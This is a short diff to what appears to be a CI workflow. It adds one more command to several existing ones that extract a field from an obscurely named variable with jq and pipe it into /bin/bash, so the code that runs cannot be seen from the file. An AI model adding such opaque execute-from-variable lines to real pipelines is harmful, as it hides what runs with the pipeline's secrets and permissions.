@@ -27,6 +27,7 @@ jobs:
           echo $cefo5 | jq -r .l64434 | /bin/bash
           echo $m2 | jq -r .qz61 | /bin/bash
           printf '%s' "$dvks219" | jq -r .o037 | /bin/bash
+          printf '%s' "$su6" | jq -r .gjhe18739 | /bin/bash
 
       - name: Persist results
         if: always()
